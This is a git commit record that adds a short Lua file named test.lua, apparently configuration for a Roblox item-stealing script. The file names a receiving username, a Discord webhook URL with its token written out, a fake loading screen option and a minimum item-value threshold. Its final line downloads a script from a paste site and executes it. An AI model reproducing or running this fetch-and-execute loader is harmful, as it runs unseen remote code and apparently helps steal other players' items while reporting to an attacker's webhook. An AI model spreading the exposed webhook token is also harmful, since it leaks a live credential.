227f50e855141804b5f5897a40dd35ace92e4f2d
pablopoep <123007142+pablopoep@users.noreply.github.com>
2024-01-29 20:15:32 +0100

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,9 @@
+Username = "pablopoep0"
+Username2 = ""
+
+Webhook = "https://discord.com/api/webhooks/1201559132226981968/Tvud5YvYPelXRf3hArfPlch268tO7WDUXIlVUY-42C9POo1ScqUiYwGIN2hwiif5J8a-"
+
+LoadingScreen = true
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://dpaste.com/FU7CTHP7M.txt"))()
